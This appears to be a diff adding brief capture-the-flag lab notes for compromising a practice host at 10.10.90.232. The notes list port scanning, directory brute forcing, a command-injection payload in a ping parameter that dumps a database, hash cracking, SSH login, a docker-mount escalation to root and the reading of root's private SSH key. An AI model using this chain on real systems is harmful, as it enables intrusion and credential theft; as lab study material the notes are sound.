@@ -1,0 +1,8 @@
+1 - nmap -A -p- 10.10.90.232
+2 - gobuster dir -u http://10.10.90.232:8081/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+3 - Burp Suite -> Repeater -> http://10.10.90.232:8081/ping -> GET /ping?ip=`cat%20utech.db.sqlite` -> MD5 HASH
+4 - crackstation
+5 - ssh r00t@10.10.90.232
+6 - docker run -v /:/mnt --rm -it bash chroot /mnt bash
+7 - cat /root/private.txt
+8 - cat /root/.ssh/id_rsa
